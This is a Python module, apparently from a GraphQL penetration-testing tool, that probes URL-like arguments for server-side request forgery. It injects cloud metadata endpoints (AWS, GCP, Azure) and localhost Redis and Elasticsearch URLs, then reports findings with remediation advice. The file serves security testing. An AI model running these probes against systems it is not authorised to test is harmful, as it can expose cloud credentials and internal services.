"""
SSRF Module
Tests URL-accepting GraphQL arguments for Server-Side Request Forgery
by injecting well-known internal/cloud metadata endpoints.
"""

from __future__ import annotations

import asyncio

from gqlpwn.core.requester import RequestError
from gqlpwn.modules.base import BaseModule, ModuleMetadata
from gqlpwn.utils.helpers import truncate
from gqlpwn.utils.logger import get_logger
from gqlpwn.utils.models import Finding, GraphQLField, RunContext

logger = get_logger(__name__)

# SSRF probe URLs — ordered from most impactful to least
_SSRF_PROBES: list[dict] = [
    {
        "url": "http://169.254.169.254/latest/meta-data/",
        "label": "AWS IMDS v1",
        "evidence_hints": ["ami-id", "instance-id", "iam", "security-credentials"],
        "severity": "critical",
    },
    {
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "label": "GCP Metadata",
        "evidence_hints": ["project-id", "service-accounts", "token"],
        "severity": "critical",
    },
    {
        "url": "http://169.254.169.254/metadata/instance",
        "label": "Azure IMDS",
        "evidence_hints": ["subscriptionId", "resourceGroupName", "vmId"],
        "severity": "critical",
    },
    {
        "url": "http://localhost/",
        "label": "Localhost loopback",
        "evidence_hints": ["127.0.0.1", "localhost", "html", "server"],
        "severity": "high",
    },
    {
        "url": "http://127.0.0.1:6379/",
        "label": "Redis on localhost",
        "evidence_hints": ["-ERR", "PONG", "redis"],
        "severity": "high",
    },
    {
        "url": "http://127.0.0.1:9200/",
        "label": "Elasticsearch on localhost",
        "evidence_hints": ["cluster_name", "elasticsearch", "tagline"],
        "severity": "high",
    },
    {
        "url": "http://0.0.0.0/",
        "label": "0.0.0.0 loopback",
        "evidence_hints": ["html", "server", "connection refused"],
        "severity": "medium",
    },
]

# Argument name patterns that suggest a URL parameter
_URL_ARG_PATTERNS = {
    "url", "uri", "endpoint", "link", "href", "src",
    "source", "webhook", "callback", "redirect", "target",
    "proxy", "fetch", "request", "host", "address",
}


def _arg_looks_like_url(name: str) -> bool:
    return name.lower() in _URL_ARG_PATTERNS or "url" in name.lower() or "uri" in name.lower()


class SsrfModule(BaseModule):
    """
    Tests GraphQL fields with URL-type arguments for Server-Side Request Forgery.

    Uses both schema-derived URL argument detection and brute-forces common
    URL argument names on fields that have string arguments.
    """

    metadata = ModuleMetadata(
        name="ssrf",
        description="Tests URL arguments for SSRF via cloud metadata and localhost probes",
        references=[
            "https://owasp.org/www-project-top-ten/",
            "https://portswigger.net/web-security/ssrf",
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
        ],
    )

    async def run(self, ctx: RunContext) -> list[Finding]:
        if not ctx.schema:
            return []

        # Schema-detected URL fields
        url_fields = ctx.schema.url_fields()

        # Also probe string args that look URL-shaped
        extra: list[tuple[GraphQLField, str]] = []
        for field in ctx.schema.injectable_fields():
            for arg in field.args:
                if _arg_looks_like_url(arg.name):
                    extra.append((field, arg.name))

        tasks: list = []
        for field in url_fields:
            for arg in field.args:
                if _arg_looks_like_url(arg.name):
                    tasks.append(self._probe_arg(ctx, field.name, arg.name))
        for field, arg_name in extra:
            tasks.append(self._probe_arg(ctx, field.name, arg_name))

        if not tasks:
            logger.info("ssrf_no_url_args")
            return []

        logger.info("ssrf_targets", count=len(tasks))
        nested = await asyncio.gather(*tasks)
        return [f for batch in nested for f in batch]

    async def _probe_arg(
        self, ctx: RunContext, field_name: str, arg_name: str
    ) -> list[Finding]:
        req = ctx.requester
        findings: list[Finding] = []

        for probe in _SSRF_PROBES:
            query = f'{{ {field_name}({arg_name}: "{probe["url"]}") }}'
            try:
                resp = await req.graphql(query)  # type: ignore[union-attr]
                body = resp.text

                if self._response_indicates_ssrf(body, probe["evidence_hints"]):
                    findings.append(
                        self.finding(
                            title=f"SSRF — {field_name}.{arg_name} ({probe['label']})",
                            severity=probe["severity"],  # type: ignore[arg-type]
                            description=(
                                f"The argument '{arg_name}' on field '{field_name}' causes "
                                f"the server to issue an HTTP request to the attacker-controlled URL. "
                                f"A probe targeting {probe['label']} ({probe['url']}) returned "
                                f"content that matches the expected response, confirming SSRF. "
                                f"This may allow access to cloud metadata, internal services, "
                                f"or credentials."
                            ),
                            endpoint=ctx.url,
                            payload=probe["url"],
                            evidence=truncate(body, 400),
                            remediation=(
                                "Validate all URL arguments against an allowlist of permitted "
                                "hosts and schemes. Block requests to RFC-1918 IP ranges, "
                                "link-local addresses (169.254.0.0/16), and loopback. "
                                "Use a dedicated egress proxy with network-level controls."
                            ),
                        )
                    )
                    break  # One confirmed SSRF per (field, arg) is enough
            except (RequestError, AttributeError):
                pass

        return findings

    @staticmethod
    def _response_indicates_ssrf(body: str, hints: list[str]) -> bool:
        """Check if the response contains evidence of a successful internal request."""
        body_lower = body.lower()
        return any(hint.lower() in body_lower for hint in hints)
